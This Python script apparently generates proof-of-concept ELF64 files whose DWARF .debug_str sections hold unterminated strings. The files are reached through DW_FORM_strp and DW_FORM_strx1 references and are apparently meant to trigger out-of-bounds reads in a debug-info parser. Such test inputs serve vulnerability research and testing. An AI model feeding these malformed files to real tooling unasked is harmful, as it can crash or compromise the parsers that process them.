import struct

def elf64(sections):
    # sections list: (name, type, flags, data, addralign, entsize, link, info)
    # add null and shstrtab
    names=b'\0'
    sec_entries=[('',0,0,b'',0,0,0,0)]
    for s in sections:
        sec_entries.append(s)
    shstr=b'\0'
    name_offsets=[]
    for name,*rest in sec_entries:
        name_offsets.append(len(shstr))
        if name:
            shstr += name.encode()+b'\0'
    shstr_name_off=len(shstr); shstr += b'.shstrtab\0'
    sec_entries.append(('.shstrtab',3,0,shstr,1,0,0,0)); name_offsets.append(shstr_name_off)
    ehsize=64; shentsize=64; phentsize=56
    offset=ehsize
    datas=[]
    for name,typ,flags,data,align,entsize,link,info in sec_entries[1:]:
        if typ==8 or len(data)==0:
            datas.append((0,data))
            continue
        align=max(align,1)
        offset=(offset+align-1)//align*align
        datas.append((offset,data))
        offset += len(data)
    shoff=(offset+7)//8*8
    e_shnum=len(sec_entries); e_shstrndx=e_shnum-1
    ident=b'\x7fELF'+bytes([2,1,1,0])+bytes(8)
    hdr=struct.pack('<16sHHIQQQIHHHHHH', ident, 1, 62, 1, 0, 0, shoff, 0, ehsize, phentsize, 0, shentsize, e_shnum, e_shstrndx)
    out=bytearray(hdr)
    for off,data in datas:
        if off:
            out += b'\0'*(off-len(out)); out += data
    out += b'\0'*(shoff-len(out))
    # section headers
    out += bytes(64)
    for idx,(name,typ,flags,data,align,entsize,link,info) in enumerate(sec_entries[1:], start=1):
        off,dat=datas[idx-1]
        size=len(dat)
        out += struct.pack('<IIQQQQIIQQ', name_offsets[idx], typ, flags, 0, off, size, link, info, align, entsize)
    return bytes(out)

def debug_info_v4(abbrev_off=0):
    body=struct.pack('<H I B',4,abbrev_off,8)+b'\x01'+struct.pack('<I',0)+b'\x00'
    return struct.pack('<I', len(body))+body

def debug_info_v5_strx():
    # v5 header: length, version, unit_type compile, addr_size, abbrev_offset; DIE abbrev 1, strx1 index 0, null
    body=struct.pack('<H B B I',5,1,8,0)+b'\x01\x00\x00'
    return struct.pack('<I', len(body))+body
# abbrev v4: code1 compile_unit children no, DW_AT_name DW_FORM_strp, end; abbrev end
abbrev_v4=b'\x01\x11\x00\x03\x0e\x00\x00\x00'
# abbrev v5 strx1: code1 compile_unit, name strx1
abbrev_v5=b'\x01\x11\x00\x03\x25\x00\x00\x00'
# symtab simple? not now
cases={}
cases['/workspace/poc1_strp_unterm.elf']=elf64([
    ('.debug_info',1,0,debug_info_v4(),1,0,0,0),
    ('.debug_abbrev',1,0,abbrev_v4,1,0,0,0),
    ('.debug_str',1,0,b'AAAA',1,0,0,0),
])
cases['/workspace/poc2_strx_unterm.elf']=elf64([
    ('.debug_info',1,0,debug_info_v5_strx(),1,0,0,0),
    ('.debug_abbrev',1,0,abbrev_v5,1,0,0,0),
    ('.debug_str_offsets',1,0,struct.pack('<I',0),1,0,0,0),
    ('.debug_str',1,0,b'BBBB',1,0,0,0),
])
# minimal ET_REL with alloc section too? add .text SHF_ALLOC to make offline module nonzero maybe no phdr needed
for path,data in cases.items():
    open(path,'wb').write(data)
    print(path,len(data))
